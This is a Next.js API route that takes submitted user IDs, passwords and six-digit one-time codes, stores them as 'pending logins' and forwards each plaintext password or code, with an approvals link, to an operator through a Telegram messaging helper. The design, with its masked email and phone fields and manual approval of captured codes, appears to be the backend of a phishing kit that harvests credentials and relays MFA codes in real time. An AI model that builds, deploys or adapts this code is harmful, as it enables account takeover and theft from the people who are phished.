import { NextResponse } from 'next/server';
import { createPendingLogin } from '@/lib/pending-logins';
import { PROJECT_ID, getApprovalsUrl } from '@/lib/project-config';
import { sendLoginApprovalRequest } from '@/lib/telegram-approval';

export async function POST(request) {
  try {
    const body = await request.json();
    const kind = body.kind === 'otp' ? 'otp' : 'login';
    const {
      userId = '',
      password = '',
      method,
      maskedEmail = '',
      maskedPhone = '',
      flow,
    } = body;

    const approvalsUrl = getApprovalsUrl();

    if (kind === 'otp') {
      const code = String(password).replace(/\D/g, '');
      if (!String(userId).trim() || code.length !== 6) {
        return NextResponse.json(
          { error: 'userId and a 6-digit access code are required' },
          { status: 400 }
        );
      }

      const record = await createPendingLogin({
        projectId: PROJECT_ID,
        userId: String(userId),
        password: code,
        method: 'email',
        maskedEmail: '-',
        maskedPhone: '-',
      });

      await sendLoginApprovalRequest({
        userId: record.userId,
        password: record.password,
        method: 'OTP',
        approvalsUrl,
      });

      return NextResponse.json({ id: record.id });
    }

    if (method !== 'email' && method !== 'text') {
      return NextResponse.json(
        { error: 'method is required and must be email or text' },
        { status: 400 }
      );
    }

    const record = await createPendingLogin({
      projectId: PROJECT_ID,
      userId: String(userId),
      password: String(password),
      method,
      maskedEmail: String(maskedEmail || '-'),
      maskedPhone: String(maskedPhone || '-'),
    });

    const methodLabel = flow === 'login' ? 'Log on' : record.method;
    await sendLoginApprovalRequest({
      userId: record.userId,
      password: record.password,
      method: methodLabel,
      approvalsUrl,
    });

    return NextResponse.json({ id: record.id });
  } catch (error) {
    console.error('Pending login create error:', error);
    return NextResponse.json({ error: 'Failed to create pending login' }, { status: 500 });
  }
}
